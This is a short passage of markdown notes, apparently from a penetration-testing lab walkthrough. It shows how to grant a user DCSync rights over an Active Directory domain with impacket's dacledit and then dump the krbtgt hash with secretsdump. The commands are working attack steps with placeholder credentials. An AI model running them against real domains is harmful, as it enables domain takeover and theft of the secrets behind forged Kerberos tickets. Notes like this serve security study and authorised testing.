#### Modify DACLs with `dacledit`
We will use the `-action write` option to indicate that we want to modify the `DACL`, followed by the `-rights dcsync` option to indicate the access rights we want to assign to the account one we have selected.
```shell
impacket-dacledit -principal <USER> -target-dn dc=domain,dc=local -dc-ip <TARGET-IP> domain.local/<USER>:<PASSWORD> -action write -rights DCSync
```
#### Querying Luna's DACL over the Domain
```shell
dacledit.py -principal <USER> -target-dn dc=domain,dc=local -dc-ip <TARGET-IP> domain.local/<USER>:<PASSWORD>
```
![[Pasted image 20251230125323.png]]
#### Attempting DCSync after DACL Modification
```shell
secretsdump.py -just-dc-user krbtgt domain.local/<USER>:<PASSWORD>@<TARGET-IP>
```
![[Pasted image 20251230125501.png]]
